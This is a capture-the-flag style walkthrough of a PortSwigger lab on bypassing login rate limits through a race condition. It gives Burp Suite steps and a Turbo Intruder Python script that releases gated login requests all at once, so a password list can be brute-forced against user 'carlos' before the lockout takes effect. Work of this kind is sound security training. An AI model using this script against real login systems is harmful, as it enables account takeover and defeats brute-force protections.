# [Bypassing rate limits via race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits)

**the exploit needs the `Turbo Intruder` app in the `Burp Suite`**

> login attempt with a password list

- open Burp Suite and visit the page
- attempt a fake log in
- if you try to log in 3 times unsuccessfully the server will lock you out for a minute
- there is a window between the 3rd unsuccessful login attempt and the initialized time block
- this short time period is the window where the many tries must be done
- the `Turbo Intruder` can help in this situation, it sends many request in a short period of time with different passwords

> burp suite section

- check the history and send the `/login` request to the `Turbo Intruder`
- `right click > Extensions > Turbo Intruder > Send to turbo intruder`
- it opens the `Turbo Intruder`'s window
- add the following code to the editor

```py
def queueRequests(target, wordlists):

    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    # assign the list of candidate passwords from your clipboard
    passwords = wordlists.clipboard

    # queue a login request using each password from the wordlist
    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
    for password in passwords:
        engine.queue(target.req, password, gate='1')

    # once every request has been queued
    # invoke engine.openGate() to send all requests in the given gate simultaneously
    engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)
```

- in the request change the query to `csrf=...&username=carlos&password=%s`
- the `%s` will be replaced with the different passwords
- copy the provided password list (ctrl+c)
- hit the attack button on the bottom of the `Turbo Intruder`
- the password will be the one with the `302` response aka the request got redirected
- might need to wait a minute to try again the login because of the may failed login attempt caught up
